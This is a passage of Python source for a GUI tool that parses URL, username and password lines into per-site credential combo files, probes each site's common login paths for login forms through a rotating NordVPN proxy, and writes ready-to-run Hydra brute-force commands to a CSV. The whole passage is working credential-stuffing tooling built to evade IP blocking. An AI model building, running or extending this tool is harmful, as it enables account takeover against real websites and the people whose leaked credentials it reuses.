                            if self.pipeline_cancelled:
                                self.cleanup_after_pipeline("Cancelled while paused")
                                return

                        line = raw.strip() if self.trim_whitespace.get() else raw.rstrip("\n\r")
                        if self.skip_blank.get() and not line:
                            continue
                        parts = split_three_fields(line)
                        if not parts:
                            skipped += 1
                            continue

                        rows.append(parts)
                        user, pw = parts[1], parts[2]
                        if user or pw:
                            orig_url = normalize_site(parts[0])
                            if orig_url:
                                base = get_base_url(orig_url)
                                if base:
                                    site_combos.setdefault(base, set()).add(f"{user}:{pw}")

            self._write_log_threadsafe(f"Main CSV: {len(rows)} rows | {skipped} skipped")

            for base, combos_set in site_combos.items():
                combo_path = out_path.parent / get_site_filename(base)
                existing = set()
                if combo_path.exists():
                    with combo_path.open("r", encoding='utf-8') as f:
                        existing = set(line.strip() for line in f if line.strip())
                new_unique = combos_set - existing
                if new_unique:
                    with combo_path.open("a", encoding='utf-8') as f:
                        f.write("\n".join(new_unique) + "\n")
                        f.flush()
                    self._write_log_threadsafe(f"Appended {len(new_unique)} new combos to {combo_path.name}")
                    self.processed_data.setdefault(base, {})['combo_count'] = len(existing) + len(new_unique)

            self.save_processed_data()

            proxy = self.setup_nordvpn_proxy() if self.use_proxy.get() else None

            if self.extract_forms.get() and site_combos:
                site_list = []
                for base in site_combos:
                    if retry_failed_only:
                        if base in self.processed_data and self.processed_data[base].get('form_found', False):
                            continue
                    elif base in self.processed_data and self.processed_data[base].get('form_found', False):
                        continue
                    site_list.append(base)

                if not site_list:
                    self._write_log_threadsafe("No sites need form extraction.")
                    self.cleanup_after_pipeline("Complete - No new forms needed.")
                    return

                self._write_log_threadsafe(f"Extracting forms for {len(site_list)} sites...")
                self._update_status_threadsafe("Extracting forms...")
                self._update_progress_threadsafe(mode="determinate", maximum=len(site_list), value=0)
                self._show_progress_threadsafe(True)

                results = []
                total = len(site_list)
                rotation_counter = 0

                def extract_for_site(base):
                    nonlocal rotation_counter
                    if self.pipeline_cancelled:
                        return None

                    while self.pipeline_paused:
                        time.sleep(0.5)
                        if self.pipeline_cancelled:
                            return None

                    urls_to_try = [base]
                    if not self.tld_only.get():
                        urls_to_try.append(base)

                    clean_base = base.rstrip('/')
                    for path in COMMON_LOGIN_PATHS:
                        urls_to_try.append(f"{clean_base}{path}")

                    form = None
                    fail_reason = None
                    for url in urls_to_try:
                        if not url: continue
                        form_data, error = extract_login_form(url, proxy, strict_validation=self.strict_validation.get())
                        if form_data:
                            form = form_data
                            break
                        fail_reason = error or fail_reason

                    rotation_counter += 1
                    if rotation_counter % 10 == 0 or fail_reason:
                        self.rotate_nordvpn()

                    return form, fail_reason

                with ThreadPoolExecutor(max_workers=self.threads.get()) as executor:
                    future_to_base = {executor.submit(extract_for_site, base): base for base in site_list}
                    for i, future in enumerate(as_completed(future_to_base), 1):
                        if self.pipeline_cancelled:
                            self.cleanup_after_pipeline("Cancelled during extraction")
                            return

                        while self.pipeline_paused:
                            time.sleep(0.5)
                            if self.pipeline_cancelled:
                                self.cleanup_after_pipeline("Cancelled while paused")
                                return

                        base = future_to_base[future]
                        try:
                            form, fail_reason = future.result()
                            if form:
                                form['base_url'] = base
                                form['combo_file'] = get_site_filename(base)
                                form['full_hydra_command'] = form['hydra_command_template'].replace("{{combo_file}}", get_site_filename(base))
                                results.append(form)
                                self.processed_data[base] = {
                                    'last_processed': datetime.now().isoformat(),
                                    'form_found': True,
                                    'failed_urls': [],
                                    'combo_count': self.processed_data.get(base, {}).get('combo_count', 0)
                                }
                            else:
                                self.processed_data.setdefault(base, {})
                                self.processed_data[base]['last_processed'] = datetime.now().isoformat()
                                self.processed_data[base]['form_found'] = False
                                self.processed_data[base]['failed_urls'].append({'url': base, 'reason': fail_reason or "unknown"})
                                self.processed_data[base]['combo_count'] = self.processed_data.get(base, {}).get('combo_count', 0)
                        except Exception as e:
                            print(f"Thread error for {base}: {e}")

                        self._update_progress_threadsafe(value=i)
                        self._update_status_threadsafe(f"Extracting: {i}/{total}")
                        self.root.update_idletasks()

                self._show_progress_threadsafe(False)

                if results:
                    keys = ['original_url', 'base_url', 'used_url', 'used_type', 'action', 'post_data',
                            'failure_condition', 'hydra_command_template', 'combo_file', 'full_hydra_command', 'confidence', 'validation_reason']
                    with forms_path.open("w", newline="", encoding="utf-8") as f:
                        writer = csv.DictWriter(f, fieldnames=keys)
                        writer.writeheader()
                        writer.writerows(results)
                    self._write_log_threadsafe(f"Found {len(results)} validated forms → {forms_path}")

                self._write_log_threadsafe("Updated processed_sites.json")
                self.save_processed_data()

            self.cleanup_after_pipeline("Pipeline complete! Check per-site files and hydra_forms.csv")

        except Exception as e:
            self.cleanup_after_pipeline(f"Pipeline failed: {str(e)}")

def main():
    root = tk.Tk()
    try:
        style = ttk.Style()
        style.theme_use("clam")
    except:
        pass
    CombinedParserGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()